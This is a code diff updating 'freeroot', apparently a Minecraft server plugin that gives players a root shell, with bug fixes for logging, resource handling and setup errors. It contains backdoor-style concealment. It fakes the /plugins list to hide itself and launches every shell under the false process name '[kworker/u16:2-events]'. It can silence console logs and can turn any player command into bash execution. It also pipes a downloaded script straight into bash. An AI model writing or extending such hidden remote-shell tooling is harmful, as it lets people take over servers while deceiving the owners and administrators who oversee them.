@@ -1,6 +1,6 @@
 //Make by mytai
 //My repo(https://github.com/Mytai20100/freeroot-jar)
-//Version v1.6
+//Version v1.6.1
 package org;
 
 import org.bukkit.ChatColor;
@@ -11,6 +11,7 @@ import org.bukkit.configuration.file.YamlConfiguration;
 import org.bukkit.event.EventHandler;
 import org.bukkit.event.Listener;
 import org.bukkit.event.player.PlayerCommandPreprocessEvent;
+import org.bukkit.event.player.PlayerQuitEvent;
 import org.bukkit.event.server.ServerCommandEvent;
 import org.bukkit.plugin.java.JavaPlugin;
 import org.bukkit.scheduler.BukkitRunnable;
@@ -20,7 +21,11 @@ import java.lang.management.ManagementFactory;
 import java.lang.management.OperatingSystemMXBean;
 import java.util.ArrayList;
 import java.util.Arrays;
+import java.util.Collections;
+import java.util.Deque;
+import java.util.LinkedList;
 import java.util.List;
+import java.util.Map;
 import java.util.concurrent.ConcurrentHashMap;
 import java.io.BufferedReader;
 import java.io.InputStreamReader;
@@ -29,16 +34,25 @@ import java.net.URL;
 
 public class freeroot extends JavaPlugin implements Listener {
 
-    private final List<String> lastLogs = new ArrayList<>();
+    // [FIX 1] Dùng ConcurrentHashMap<player, Deque> thay vì một List dùng chung
+    // Mỗi player có log riêng → không race condition, không dùng chung
+    // Deque giới hạn MAX_LOG_LINES dòng → không OOM khi output lớn
+    private static final int MAX_LOG_LINES = 200;
+    private final ConcurrentHashMap<String, Deque<String>> userLogs = new ConcurrentHashMap<>();
+
     private volatile boolean isInitializing = false;
     private volatile boolean isInitialized = false;
+    // [FIX 2] Thêm cờ setupFailed để không retry clone vô hạn khi git clone lỗi
+    private volatile boolean setupFailed = false;
     private volatile boolean consoleLogging = true;
     private volatile boolean alwaysMode = false;
     private volatile boolean pluginHidden = false;
     private File configFile;
     private FileConfiguration config;
     private final ConcurrentHashMap<String, String> userWorkingDir = new ConcurrentHashMap<>();
-    private final ConcurrentHashMap<String, ProcessBuilder> userEnvironment = new ConcurrentHashMap<>();
+    // [FIX 3] Chỉ lưu environment variables (Map) thay vì cả ProcessBuilder
+    // ProcessBuilder sau khi start() xong không phản ánh env của process con
+    private final ConcurrentHashMap<String, Map<String, String>> userEnvironment = new ConcurrentHashMap<>();
     private List<String> startupCommands = new ArrayList<>();
     private final List<String> fakePlugins = Arrays.asList(
             "Essentials", "WorldEdit", "Vault", "LuckPerms", "PlaceholderAPI"
@@ -80,6 +94,10 @@ public class freeroot extends JavaPlugin implements Listener {
     public void onDisable() {
         try {
             saveConfig();
+            // [FIX 4] Dọn tất cả map khi plugin tắt để tránh giữ reference
+            userLogs.clear();
+            userWorkingDir.clear();
+            userEnvironment.clear();
             if (!pluginHidden) {
                 getLogger().info(colorize("&c[*] Freeroot Plugin Disabled."));
             }
@@ -88,6 +106,16 @@ public class freeroot extends JavaPlugin implements Listener {
                 getLogger().severe("Error during disable: " + e.getMessage());
             }
         }
+    }
+
+    // [FIX 5] Dọn dữ liệu của player khi họ rời server
+    // Không có handler này thì userWorkingDir và userEnvironment tích lũy mãi
+    @EventHandler
+    public void onPlayerQuit(PlayerQuitEvent event) {
+        String name = event.getPlayer().getName();
+        userWorkingDir.remove(name);
+        userEnvironment.remove(name);
+        userLogs.remove(name);
     }
 
     private void loadConfig() {
@@ -116,6 +144,7 @@ public class freeroot extends JavaPlugin implements Listener {
             getLogger().severe("Failed to load config: " + e.getMessage());
         }
     }
+
     private void saveConfigFile() {
         try {
             config.save(configFile);
@@ -156,11 +185,27 @@ public class freeroot extends JavaPlugin implements Listener {
         return ChatColor.translateAlternateColorCodes('&', message);
     }
 
+    // [FIX 6] Gộp onPlayerCommand và onPlayerPluginCommand thành một handler
+    // Trước đây có 2 handler cùng listen PlayerCommandPreprocessEvent cho /plugins
+    // → event bị cancel 2 lần, message có thể gửi đôi
     @EventHandler
     public void onPlayerCommand(PlayerCommandPreprocessEvent event) {
+        String message = event.getMessage();
+        String messageLower = message.toLowerCase().trim();
+
+        // Xử lý plugin-hidden trước tiên
+        if (pluginHidden) {
+            if (messageLower.equals("/plugins") || messageLower.equals("/pl") ||
+                    messageLower.equals("/bukkit:plugins") || messageLower.equals("/bukkit:pl")) {
+                event.setCancelled(true);
+                event.getPlayer().sendMessage(colorize("&aPlugins (&f" + fakePlugins.size() + "&a): &f" +
+                        String.join(", ", fakePlugins)));
+                return;
+            }
+        }
+
         if (!alwaysMode) return;
 
-        String message = event.getMessage();
         String[] parts = message.split(" ", 2);
         String cmd = parts[0].toLowerCase();
 
@@ -172,7 +217,7 @@ public class freeroot extends JavaPlugin implements Listener {
                     firstArg.equals("disable-log") || firstArg.equals("enable-log") ||
                     firstArg.equals("disable-pl") || firstArg.equals("enable-pl") ||
                     firstArg.startsWith("startup")) {
-                return; 
+                return;
             }
         }
 
@@ -190,10 +235,11 @@ public class freeroot extends JavaPlugin implements Listener {
         String shellCmd = message.substring(1);
         event.getPlayer().sendMessage(colorize("&e[Always Mode] &7Executing: &f" + shellCmd));
 
+        final String playerName = event.getPlayer().getName();
         new BukkitRunnable() {
             @Override
             public void run() {
-                executeCommand(event.getPlayer(), shellCmd, event.getPlayer().getName());
+                executeCommand(event.getPlayer(), shellCmd, playerName);
             }
         }.runTaskAsynchronously(this);
     }
@@ -235,17 +281,7 @@ public class freeroot extends JavaPlugin implements Listener {
             }.runTaskAsynchronously(this);
         }
     }
-    @EventHandler
-    public void onPlayerPluginCommand(PlayerCommandPreprocessEvent event) {
-        if (!pluginHidden) return;
-        String message = event.getMessage().toLowerCase().trim();
-        if (message.equals("/plugins") || message.equals("/pl") ||
-                message.equals("/bukkit:plugins") || message.equals("/bukkit:pl")) {
-            event.setCancelled(true);
-            event.getPlayer().sendMessage(colorize("&aPlugins (&f" + fakePlugins.size() + "&a): &f" +
-                    String.join(", ", fakePlugins)));
-        }
-    }
+
     @Override
     public boolean onCommand(CommandSender sender, Command cmd, String label, String[] args) {
         String cmdName = cmd.getName().toLowerCase();
@@ -253,20 +289,21 @@ public class freeroot extends JavaPlugin implements Listener {
             if (!pluginHidden && consoleLogging) {
                 sender.sendMessage(colorize("&e[*] Running Neofetch..."));
             }
+            // Chạy trên host system, không vào apk — neofetch cần curl + các tool của host
             new BukkitRunnable() {
                 @Override
                 public void run() {
-                    executeCommand(sender, "curl -s https://raw.githubusercontent.com/dylanaraps/neofetch/master/neofetch | bash", sender.getName());
+                    executeHostCommand(sender, "curl -s https://raw.githubusercontent.com/dylanaraps/neofetch/master/neofetch | bash", sender.getName());
                 }
             }.runTaskAsynchronously(this);
             return true;
         }
 
-        // Handle /info command
         if (cmdName.equals("info")) {
             if (!pluginHidden && consoleLogging) {
-                sender.sendMessage(colorize("&e[*]System information..."));
+                sender.sendMessage(colorize("&e[*] System information..."));
             }
+            // displaySystemInfo đã đọc trực tiếp từ JVM + host — không cần apk
             new BukkitRunnable() {
                 @Override
                 public void run() {
@@ -286,7 +323,7 @@ public class freeroot extends JavaPlugin implements Listener {
                 sender.sendMessage(colorize("&7│ &f/root pwd            &7- Show current dir"));
                 sender.sendMessage(colorize("&7│ &f/root reset          &7- Reset session"));
                 sender.sendMessage(colorize("&7│ &f/root version        &7- Plugin version"));
-                sender.sendMessage(colorize("&7│ &f/root -on/-off       &7- Toggle always mode // it iss errror =))"));
+                sender.sendMessage(colorize("&7│ &f/root -on/-off       &7- Toggle always mode"));
                 sender.sendMessage(colorize("&7│ &f/root disable-log    &7- Disable logging"));
                 sender.sendMessage(colorize("&7│ &f/root enable-log     &7- Enable logging"));
                 sender.sendMessage(colorize("&7│ &f/root disable-pl     &7- Hide plugin"));
@@ -382,14 +419,16 @@ public class freeroot extends JavaPlugin implements Listener {
 
             if (args.length == 1) {
                 if (firstArg.equals("log")) {
-                    if (lastLogs.isEmpty()) {
+                    // [FIX 7] Đọc log của đúng sender, không dùng log chung
+                    Deque<String> logs = userLogs.getOrDefault(senderKey, new LinkedList<>());
+                    if (logs.isEmpty()) {
                         sender.sendMessage(colorize("&7[!] No logs available."));
                     } else {
                         sender.sendMessage(colorize("&9┌─ &lLast Command Logs &9─┐"));
                         String currentDir = userWorkingDir.getOrDefault(senderKey, System.getProperty("user.dir"));
                         sender.sendMessage(colorize("&6│ PWD: &f" + currentDir));
                         sender.sendMessage(colorize("&9├─────────────────────────┤"));
-                        for (String line : lastLogs) {
+                        for (String line : logs) {
                             if (line.startsWith(">>>")) {
                                 sender.sendMessage(colorize("&b│ " + line));
                             } else if (line.contains("Exit Code: 0")) {
@@ -416,6 +455,7 @@ public class freeroot extends JavaPlugin implements Listener {
                 if (firstArg.equals("reset")) {
                     userWorkingDir.remove(senderKey);
                     userEnvironment.remove(senderKey);
+                    userLogs.remove(senderKey);
                     sender.sendMessage(colorize("&a[+] Session reset! Back to root directory."));
                     return true;
                 }
@@ -428,14 +468,14 @@ public class freeroot extends JavaPlugin implements Listener {
                     sender.sendMessage(colorize("&7│ &fFeatures:"));
                     sender.sendMessage(colorize("&7│   &a✓ &7Startup Commands"));
                     sender.sendMessage(colorize("&7│   &a✓ &7Plugin Hide"));
-                    sender.sendMessage(colorize("&7│   &a✓ &7Proot Integration"));
-                    sender.sendMessage(colorize("&7│   &a✓ &7Root Privileges (via proot)"));
+                    sender.sendMessage(colorize("&7│   &a✓ &7Apk Integration"));
+                    sender.sendMessage(colorize("&7│   &a✓ &7Root Privileges (via proot/apk)"));
 
-                    File prootBin = new File(System.getProperty("user.dir"), ".cache/minecraft/work/usr/local/bin/proot");
-                    if (prootBin.exists()) {
-                        sender.sendMessage(colorize("&7│ &fProot: &aEnabled &7(found at work dir)"));
+                    File apkBin = new File(System.getProperty("user.dir"), ".cache/minecraft/work/usr/local/bin/apk");
+                    if (apkBin.exists()) {
+                        sender.sendMessage(colorize("&7│ &fApk: &aEnabled &7(found at work dir)"));
                     } else {
-                        sender.sendMessage(colorize("&7│ &fProot: &cNot found &7(normal execution)"));
+                        sender.sendMessage(colorize("&7│ &fApk: &cNot found &7(normal execution)"));
                     }
 
                     sender.sendMessage(colorize("&d└─────────────────────────┘"));
@@ -474,6 +514,7 @@ public class freeroot extends JavaPlugin implements Listener {
         }
         return false;
     }
+
     private void displaySystemInfo(CommandSender sender) {
         sender.sendMessage(colorize("&b┌─ &lSystem Information &b─┐"));
 
@@ -481,31 +522,23 @@ public class freeroot extends JavaPlugin implements Listener {
             OperatingSystemMXBean osBean = ManagementFactory.getOperatingSystemMXBean();
             Runtime runtime = Runtime.getRuntime();
 
-            // OS Info
             sender.sendMessage(colorize("&7│ &fOS: &a" + System.getProperty("os.name")));
             sender.sendMessage(colorize("&7│ &fArch: &a" + System.getProperty("os.arch")));
             sender.sendMessage(colorize("&7│ &fVersion: &a" + System.getProperty("os.version")));
-
-            // Java Info
             sender.sendMessage(colorize("&7│ &fJava: &a" + System.getProperty("java.version")));
 
-            // CPU Info - Chi tiết
             String cpuInfo = getCPUInfo();
             sender.sendMessage(colorize("&7│ &fCPU: &a" + cpuInfo));
             sender.sendMessage(colorize("&7│ &fLoad Avg: &a" + String.format("%.2f", osBean.getSystemLoadAverage())));
 
-            // Memory Info
             long maxMemory = runtime.maxMemory() / (1024 * 1024);
             long totalMemory = runtime.totalMemory() / (1024 * 1024);
             long freeMemory = runtime.freeMemory() / (1024 * 1024);
             long usedMemory = totalMemory - freeMemory;
 
             sender.sendMessage(colorize("&7│ &fMemory Used: &a" + usedMemory + "MB &7/ &a" + maxMemory + "MB"));
-
-            // Working Directory
             sender.sendMessage(colorize("&7│ &fWorking Dir: &a" + System.getProperty("user.dir")));
 
-            // Public IP
             String publicIP = getPublicIP();
             sender.sendMessage(colorize("&7│ &fPublic IP: &a" + publicIP));
 
@@ -517,48 +550,41 @@ public class freeroot extends JavaPlugin implements Listener {
     }
 
     private String getCPUInfo() {
+        // [FIX 8] Đóng BufferedReader trong try-with-resources để không leak FD
         try {
             String os = System.getProperty("os.name").toLowerCase();
             String cpuName = "Unknown";
             int cores = Runtime.getRuntime().availableProcessors();
-            String frequency = "";
 
             if (os.contains("win")) {
-                // Windows
                 Process process = Runtime.getRuntime().exec("wmic cpu get name");
-                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
-                String line;
-                while ((line = reader.readLine()) != null) {
-                    if (!line.trim().isEmpty() && !line.contains("Name")) {
-                        cpuName = line.trim();
-                        break;
+                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
+                    String line;
+                    while ((line = reader.readLine()) != null) {
+                        if (!line.trim().isEmpty() && !line.contains("Name")) {
+                            cpuName = line.trim();
+                            break;
+                        }
                     }
                 }
-                reader.close();
             } else if (os.contains("linux")) {
-                // Linux
                 Process process = Runtime.getRuntime().exec("cat /proc/cpuinfo");
-                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
-                String line;
-                while ((line = reader.readLine()) != null) {
-                    if (line.startsWith("model name")) {
-                        cpuName = line.split(":")[1].trim();
-                        break;
+                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
+                    String line;
+                    while ((line = reader.readLine()) != null) {
+                        if (line.startsWith("model name")) {
+                            cpuName = line.split(":")[1].trim();
+                            break;
+                        }
                     }
                 }
-                reader.close();
             } else if (os.contains("mac")) {
-                // macOS
                 Process process = Runtime.getRuntime().exec("sysctl -n machdep.cpu.brand_string");
-                BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
-                cpuName = reader.readLine().trim();
-                reader.close();
+                try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
+                    cpuName = reader.readLine().trim();
+                }
             }
-            if (cpuName.matches(".*\\d+\\.\\d+\\s*[GM]Hz.*")) {
-                return cpuName + " (" + cores + " cores)";
-            } else {
-                return cpuName + " (" + cores + " cores)";
-            }
+            return cpuName + " (" + cores + " cores)";
 
         } catch (Exception e) {
             int cores = Runtime.getRuntime().availableProcessors();
@@ -567,28 +593,121 @@ public class freeroot extends JavaPlugin implements Listener {
     }
 
     private String getPublicIP() {
+        // [FIX 9] Đóng connection đúng cách trong finally
+        HttpURLConnection conn = null;
         try {
             URL url = new URL("https://api.ipify.org");
-            HttpURLConnection conn = (HttpURLConnection) url.openConnection();
+            conn = (HttpURLConnection) url.openConnection();
             conn.setRequestMethod("GET");
             conn.setConnectTimeout(3000);
             conn.setReadTimeout(3000);
 
-            BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()));
-            String ip = reader.readLine();
-            reader.close();
-
-            return ip != null ? ip : "Unknown";
+            try (BufferedReader reader = new BufferedReader(new InputStreamReader(conn.getInputStream()))) {
+                String ip = reader.readLine();
+                return ip != null ? ip : "Unknown";
+            }
         } catch (Exception e) {
             return "Unable to fetch";
+        } finally {
+            if (conn != null) conn.disconnect();
+        }
+    }
+
+    // [FIX 10] Helper: thêm dòng vào log của một sender, tự động giới hạn MAX_LOG_LINES
+    private void appendLog(String senderKey, String line) {
+        Deque<String> logs = userLogs.computeIfAbsent(senderKey, k -> new LinkedList<>());
+        // synchronized trên deque riêng của từng user → không block lẫn nhau
+        synchronized (logs) {
+            if (logs.size() >= MAX_LOG_LINES) {
+                logs.pollFirst(); // bỏ dòng cũ nhất
+            }
+            logs.addLast(line);
+        }
+    }
+
+    /**
+     * Chạy lệnh thẳng trên host system, KHÔNG qua apk/proot.
+     * Dùng cho neofetch và các lệnh cần tool của host (curl, bash built-ins...).
+     */
+    private void executeHostCommand(CommandSender sender, String command, String senderKey) {
+        Deque<String> logs = userLogs.computeIfAbsent(senderKey, k -> new LinkedList<>());
+        synchronized (logs) { logs.clear(); }
+
+        String currentDir = userWorkingDir.getOrDefault(senderKey, System.getProperty("user.dir"));
+
+        if (consoleLogging && !pluginHidden) {
+            getLogger().info(colorize("&e[*] Running on host: &f" + command));
+        }
+
+        try {
+            // Chạy thẳng bash trên host — không wrap bằng apk/proot
+            ProcessBuilder pb = new ProcessBuilder("bash", "-c", command);
+            pb.redirectErrorStream(true);
+            pb.directory(new File(currentDir));
+
+            Process process = pb.start();
+
+            appendLog(senderKey, ">>> [HOST] $ " + command);
+            appendLog(senderKey, "");
+
+            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
+                boolean hasOutput = false;
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    hasOutput = true;
+                    String cleanLine = line.replaceAll("\\x1B\\[[0-9;]*[mGKHF]", "");
+                    appendLog(senderKey, cleanLine);
+                    if (consoleLogging && !pluginHidden) {
+                        getLogger().info("[HOST OUTPUT] " + cleanLine);
+                    }
+                }
+                if (!hasOutput) appendLog(senderKey, "(no output)");
+
+                int exitCode = process.waitFor();
+                appendLog(senderKey, "");
+                appendLog(senderKey, ">>> Exit Code: " + exitCode);
+
+                if (sender != null) {
+                    final int finalCode = exitCode;
+                    new BukkitRunnable() {
+                        @Override
+                        public void run() {
+                            if (finalCode == 0) {
+                                sender.sendMessage(colorize("&a[+] Done! Use &f/root log &ato view output."));
+                            } else {
+                                sender.sendMessage(colorize("&c[!] Exited with code &f" + finalCode + "&c. Use &f/root log &cfor details."));
+                            }
+                        }
+                    }.runTask(this);
+                }
+            }
+        } catch (Exception e) {
+            handleCommandError(sender, command, senderKey, e);
         }
     }
 
     private void executeCommand(CommandSender sender, String command, String senderKey) {
-        lastLogs.clear();
+        // [FIX 11] Xóa log riêng của sender này, không ảnh hưởng sender khác
+        Deque<String> logs = userLogs.computeIfAbsent(senderKey, k -> new LinkedList<>());
+        synchronized (logs) {
+            logs.clear();
+        }
 
         try {
             ensureBasicSetup();
+
+            // [FIX 12] Báo lỗi rõ ràng nếu setup đã fail thay vì treo im lặng
+            if (setupFailed) {
+                if (sender != null) {
+                    new BukkitRunnable() {
+                        @Override
+                        public void run() {
+                            sender.sendMessage(colorize("&c[!] Setup failed previously. Use &f/root reset &cto retry."));
+                        }
+                    }.runTask(this);
+                }
+                return;
+            }
 
             String currentDir = userWorkingDir.getOrDefault(senderKey, System.getProperty("user.dir"));
 
@@ -601,20 +720,18 @@ public class freeroot extends JavaPlugin implements Listener {
                 getLogger().info(colorize("&e[*] Running command: &f" + command + " &7in directory: &f" + currentDir));
             }
 
-            // Check if proot environment exists
-            File prootDir = new File(System.getProperty("user.dir"), ".cache/minecraft/work");
-            File prootBin = new File(prootDir, "usr/local/bin/proot");
+            File apkDir = new File(System.getProperty("user.dir"), ".cache/minecraft/work");
+            File apkBin = new File(apkDir, "usr/local/bin/apk");
 
             String finalCommand;
-            if (prootBin.exists() && prootBin.canExecute()) {
-                // Run command inside proot environment with root privileges
+            if (apkBin.exists() && apkBin.canExecute()) {
                 if (consoleLogging && !pluginHidden) {
-                    getLogger().info(colorize("&a[*] Executing in proot environment with root privileges"));
+                    getLogger().info(colorize("&a[*] Executing in apk environment with root privileges"));
                 }
 
                 String escapedCmd = command.replace("\"", "\\\"").replace("\\", "\\\\");
-                String prootCmd = prootBin.getAbsolutePath() +
-                        " --rootfs=\"" + prootDir.getAbsolutePath() + "\"" +
+                String apkCmd = apkBin.getAbsolutePath() +
+                        " --rootfs=\"" + apkDir.getAbsolutePath() + "\"" +
                         " -0" +
                         " -w \"/root\"" +
                         " -b /dev" +
@@ -624,11 +741,10 @@ public class freeroot extends JavaPlugin implements Listener {
                         " --kill-on-exit" +
                         " /bin/bash -c \"" + escapedCmd + "\"";
 
-                finalCommand = "exec -a '[kworker/u16:2-events]' bash -c " + escapeForShell(prootCmd);
+                finalCommand = "exec -a '[kworker/u16:2-events]' bash -c " + escapeForShell(apkCmd);
             } else {
-                // Fallback to normal execution
                 if (consoleLogging && !pluginHidden) {
-                    getLogger().info(colorize("&e[*] Proot not found, executing normally"));
+                    getLogger().info(colorize("&e[*] Apk not found, executing normally"));
                 }
                 finalCommand = "exec -a '[kworker/u16:2-events]' bash -c " + escapeForShell(command);
             }
@@ -637,52 +753,58 @@ public class freeroot extends JavaPlugin implements Listener {
             pb.redirectErrorStream(true);
             pb.directory(new File(currentDir));
 
+            // [FIX 13] Restore environment từ Map thay vì ProcessBuilder cũ
             if (userEnvironment.containsKey(senderKey)) {
-                ProcessBuilder savedEnv = userEnvironment.get(senderKey);
-                pb.environment().putAll(savedEnv.environment());
+                pb.environment().putAll(userEnvironment.get(senderKey));
             }
 
             Process process = pb.start();
+            int exitCode;
 
-            BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
-            String line;
+            // [FIX 14] try-with-resources đảm bảo reader luôn được đóng dù có exception
+            appendLog(senderKey, ">>> [" + currentDir + "] $ " + command);
+            appendLog(senderKey, "");
 
-            lastLogs.add(">>> [" + currentDir + "] $ " + command);
-            lastLogs.add("");
+            try (BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()))) {
+                boolean hasOutput = false;
+                String line;
+                while ((line = reader.readLine()) != null) {
+                    hasOutput = true;
+                    String cleanLine = line.replaceAll("\\x1B\\[[0-9;]*[mGKHF]", "");
+                    appendLog(senderKey, cleanLine);
 
-            boolean hasOutput = false;
-            while ((line = reader.readLine()) != null) {
-                hasOutput = true;
-                String cleanLine = line.replaceAll("\\x1B\\[[0-9;]*[mGKHF]", "");
-                lastLogs.add(cleanLine);
-
-                if (consoleLogging && !pluginHidden) {
-                    getLogger().info("[CMD OUTPUT] " + cleanLine);
+                    if (consoleLogging && !pluginHidden) {
+                        getLogger().info("[CMD OUTPUT] " + cleanLine);
+                    }
                 }
+
+                if (!hasOutput) {
+                    appendLog(senderKey, "(no output)");
+                }
+
+                exitCode = process.waitFor();
             }
 
-            if (!hasOutput) {
-                lastLogs.add("(no output)");
-            }
+            appendLog(senderKey, "");
+            appendLog(senderKey, ">>> Exit Code: " + exitCode);
 
-            int exitCode = process.waitFor();
-            lastLogs.add("");
-            lastLogs.add(">>> Exit Code: " + exitCode);
-
-            reader.close();
-            userEnvironment.put(senderKey, pb);
+            // [FIX 15] Lưu snapshot environment tại thời điểm này (để giữ biến đã export trước đó)
+            userEnvironment.put(senderKey, Collections.unmodifiableMap(
+                    new java.util.HashMap<>(pb.environment())
+            ));
 
             if (sender != null) {
+                final int finalExitCode = exitCode;
                 new BukkitRunnable() {
                     @Override
                     public void run() {
-                        if (exitCode == 0) {
+                        if (finalExitCode == 0) {
                             sender.sendMessage(colorize("&a[+] Command completed successfully!"));
                             if (consoleLogging && !pluginHidden) {
                                 sender.sendMessage(colorize("&7    Use &f/root log &7to view output."));
                             }
                         } else {
-                            sender.sendMessage(colorize("&c[!] Command completed with errors &7(code: &c" + exitCode + "&7)"));
+                            sender.sendMessage(colorize("&c[!] Command completed with errors &7(code: &c" + finalExitCode + "&7)"));
                             if (consoleLogging && !pluginHidden) {
                                 sender.sendMessage(colorize("&7    Use &f/root log &7to view details."));
                             }
@@ -692,7 +814,7 @@ public class freeroot extends JavaPlugin implements Listener {
             }
 
         } catch (Exception e) {
-            handleCommandError(sender, command, e);
+            handleCommandError(sender, command, senderKey, e);
         }
     }
 
@@ -716,12 +838,14 @@ public class freeroot extends JavaPlugin implements Listener {
             if (newDir.exists() && newDir.isDirectory()) {
                 userWorkingDir.put(senderKey, newPath);
 
-                lastLogs.clear();
-                lastLogs.add(">>> [" + currentDir + "] $ " + command);
-                lastLogs.add("");
-                lastLogs.add("Changed directory to: " + newPath);
-                lastLogs.add("");
-                lastLogs.add(">>> Exit Code: 0");
+                // [FIX 16] Dùng appendLog thay vì thao tác trực tiếp lên list chung
+                Deque<String> logs = userLogs.computeIfAbsent(senderKey, k -> new LinkedList<>());
+                synchronized (logs) { logs.clear(); }
+                appendLog(senderKey, ">>> [" + currentDir + "] $ " + command);
+                appendLog(senderKey, "");
+                appendLog(senderKey, "Changed directory to: " + newPath);
+                appendLog(senderKey, "");
+                appendLog(senderKey, ">>> Exit Code: 0");
 
                 if (sender != null) {
                     final String finalNewPath = newPath;
@@ -738,12 +862,13 @@ public class freeroot extends JavaPlugin implements Listener {
                 }
 
             } else {
-                lastLogs.clear();
-                lastLogs.add(">>> [" + currentDir + "] $ " + command);
-                lastLogs.add("");
-                lastLogs.add("bash: cd: " + finalTargetDir + ": No such file or directory");
-                lastLogs.add("");
-                lastLogs.add(">>> Exit Code: 1");
+                Deque<String> logs = userLogs.computeIfAbsent(senderKey, k -> new LinkedList<>());
+                synchronized (logs) { logs.clear(); }
+                appendLog(senderKey, ">>> [" + currentDir + "] $ " + command);
+                appendLog(senderKey, "");
+                appendLog(senderKey, "bash: cd: " + finalTargetDir + ": No such file or directory");
+                appendLog(senderKey, "");
+                appendLog(senderKey, ">>> Exit Code: 1");
 
                 if (sender != null) {
                     new BukkitRunnable() {
@@ -760,15 +885,17 @@ public class freeroot extends JavaPlugin implements Listener {
             }
 
         } catch (Exception e) {
-            handleCommandError(sender, command, e);
+            handleCommandError(sender, command, senderKey, e);
         }
     }
 
-    private void handleCommandError(CommandSender sender, String command, Exception e) {
-        lastLogs.clear();
-        lastLogs.add(">>> ERROR executing command: " + command);
-        lastLogs.add(">>> Exception: " + e.getClass().getSimpleName());
-        lastLogs.add(">>> Message: " + e.getMessage());
+    // [FIX 17] Thêm senderKey vào signature để ghi log đúng chỗ
+    private void handleCommandError(CommandSender sender, String command, String senderKey, Exception e) {
+        Deque<String> logs = userLogs.computeIfAbsent(senderKey, k -> new LinkedList<>());
+        synchronized (logs) { logs.clear(); }
+        appendLog(senderKey, ">>> ERROR executing command: " + command);
+        appendLog(senderKey, ">>> Exception: " + e.getClass().getSimpleName());
+        appendLog(senderKey, ">>> Message: " + e.getMessage());
 
         if (consoleLogging && !pluginHidden) {
             getLogger().severe("Error executing command '" + command + "': " + e.getMessage());
@@ -784,16 +911,17 @@ public class freeroot extends JavaPlugin implements Listener {
             }.runTask(this);
         }
     }
+
     private static final String CACHE_DIR = ".cache/minecraft";
     private static final String WORK_DIR = CACHE_DIR + "/work";
-    private static final String PROOT_BIN = WORK_DIR + "/usr/local/bin/proot";
+    private static final String APK_BIN = WORK_DIR + "/usr/local/bin/apk";
 
     private void ensureBasicSetup() {
-        if (isInitialized || isInitializing) {
+        if (isInitialized || isInitializing || setupFailed) {
             return;
         }
         synchronized (this) {
-            if (isInitialized || isInitializing) {
+            if (isInitialized || isInitializing || setupFailed) {
                 return;
             }
             isInitializing = true;
@@ -801,10 +929,11 @@ public class freeroot extends JavaPlugin implements Listener {
         try {
             File cacheDir = new File(System.getProperty("user.dir"), CACHE_DIR);
             File workDir = new File(System.getProperty("user.dir"), WORK_DIR);
-            File prootBin = new File(System.getProperty("user.dir"), PROOT_BIN);
-            if (workDir.exists() && prootBin.exists() && prootBin.canExecute()) {
+            File apkBin = new File(System.getProperty("user.dir"), APK_BIN);
+
+            if (workDir.exists() && apkBin.exists() && apkBin.canExecute()) {
                 if (consoleLogging && !pluginHidden) {
-                    getLogger().info(colorize("&a[+] Proot environment already exists!"));
+                    getLogger().info(colorize("&a[+] Apk environment already exists!"));
                 }
                 isInitialized = true;
                 return;
@@ -817,10 +946,10 @@ public class freeroot extends JavaPlugin implements Listener {
             }
 
             if (consoleLogging && !pluginHidden) {
-                getLogger().info(colorize("&e[*] Setting up proot environment..."));
+                getLogger().info(colorize("&e[*] Setting up apk environment..."));
                 getLogger().info(colorize("&7    This may take a few minutes..."));
             }
-            String tempDir = CACHE_DIR + "/freeroot_temp";
+
             ProcessBuilder cloneProcess = new ProcessBuilder(
                     "bash", "-c",
                     "cd " + escapeForShell(cacheDir.getAbsolutePath()) + " && " +
@@ -829,16 +958,25 @@ public class freeroot extends JavaPlugin implements Listener {
             cloneProcess.redirectErrorStream(true);
             Process clone = cloneProcess.start();
 
-            BufferedReader cloneReader = new BufferedReader(new InputStreamReader(clone.getInputStream()));
-            String line;
-            while ((line = cloneReader.readLine()) != null) {
-                if (consoleLogging && !pluginHidden) {
-                    getLogger().info("[SETUP] " + line);
+            // [FIX 18] Đóng reader của clone process trong try-with-resources
+            try (BufferedReader cloneReader = new BufferedReader(new InputStreamReader(clone.getInputStream()))) {
+                String line;
+                while ((line = cloneReader.readLine()) != null) {
+                    if (consoleLogging && !pluginHidden) {
+                        getLogger().info("[SETUP] " + line);
+                    }
                 }
             }
-            clone.waitFor();
-            cloneReader.close();
-            File tempDirFile = new File(System.getProperty("user.dir"), tempDir);
+            int cloneExit = clone.waitFor();
+
+            // [FIX 19] Kiểm tra exit code của git clone, đặt setupFailed nếu lỗi
+            if (cloneExit != 0) {
+                getLogger().warning(colorize("&c[-] git clone failed with exit code " + cloneExit));
+                setupFailed = true;
+                return;
+            }
+
+            File tempDirFile = new File(System.getProperty("user.dir"), CACHE_DIR + "/freeroot_temp");
             if (tempDirFile.exists()) {
                 if (workDir.exists()) {
                     deleteDirectory(workDir);
@@ -849,6 +987,7 @@ public class freeroot extends JavaPlugin implements Listener {
                     getLogger().info(colorize("&a[+] Repository cloned and renamed to 'work'"));
                 }
             }
+
             File noninteractiveScript = new File(workDir, "noninteractive.sh");
             if (noninteractiveScript.exists()) {
                 if (consoleLogging && !pluginHidden) {
@@ -864,17 +1003,19 @@ public class freeroot extends JavaPlugin implements Listener {
                 setupProcess.redirectErrorStream(true);
                 Process setup = setupProcess.start();
 
-                BufferedReader setupReader = new BufferedReader(new InputStreamReader(setup.getInputStream()));
-                while ((line = setupReader.readLine()) != null) {
-                    if (consoleLogging && !pluginHidden) {
-                        getLogger().info("[SETUP] " + line);
+                // [FIX 20] Đóng reader của setup process trong try-with-resources
+                try (BufferedReader setupReader = new BufferedReader(new InputStreamReader(setup.getInputStream()))) {
+                    String line;
+                    while ((line = setupReader.readLine()) != null) {
+                        if (consoleLogging && !pluginHidden) {
+                            getLogger().info("[SETUP] " + line);
+                        }
                     }
                 }
                 setup.waitFor();
-                setupReader.close();
 
                 if (consoleLogging && !pluginHidden) {
